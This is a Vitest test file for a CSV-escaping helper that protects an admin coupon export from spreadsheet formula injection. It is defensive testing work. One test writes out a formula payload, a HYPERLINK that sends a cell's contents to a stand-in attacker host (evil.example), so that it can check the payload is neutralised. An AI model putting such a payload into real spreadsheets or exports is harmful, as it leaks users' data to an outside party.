import { describe, expect, it } from 'vitest';
import { csvSafeCell, couponBatchToCsv, toCsv } from '../../apps/api/src/domain/pricing/CsvSafe';

describe('U1 admin CSV export — spreadsheet formula-injection guard', () => {
  it('neutralises cells that begin with a formula trigger', () => {
    expect(csvSafeCell('=1+2')).toBe('"\'=1+2"');
    expect(csvSafeCell('+cmd')).toBe('"\'+cmd"');
    expect(csvSafeCell('-2')).toBe('"\'-2"');
    expect(csvSafeCell('@SUM(A1)')).toBe('"\'@SUM(A1)"');
    expect(csvSafeCell('\tTAB')).toBe('"\'\tTAB"');
  });

  it('leaves ordinary values quoted but unprefixed', () => {
    expect(csvSafeCell('SAVE10')).toBe('"SAVE10"');
    expect(csvSafeCell(1234)).toBe('"1234"');
    expect(csvSafeCell(null)).toBe('""');
  });

  it('escapes embedded quotes', () => {
    expect(csvSafeCell('a "b" c')).toBe('"a ""b"" c"');
  });

  it('the classic hyperlink-exfiltration payload cannot start a formula', () => {
    const payload = '=HYPERLINK("http://evil.example/?leak="&A1,"click")';
    const cell = csvSafeCell(payload);
    expect(cell.startsWith('"\'=')).toBe(true); // leading quote defuses the =
  });

  it('exports a coupon batch with a header and one safe row per code', () => {
    const csv = couponBatchToCsv(['ABCDEF23', '=EVIL']);
    const rows = csv.split('\r\n');
    expect(rows[0]).toBe('"code"');
    expect(rows[1]).toBe('"ABCDEF23"');
    expect(rows[2]).toBe('"\'=EVIL"');
  });

  it('toCsv joins rows with CRLF', () => {
    expect(toCsv([['a', 'b'], ['c', 'd']])).toBe('"a","b"\r\n"c","d"');
  });
});
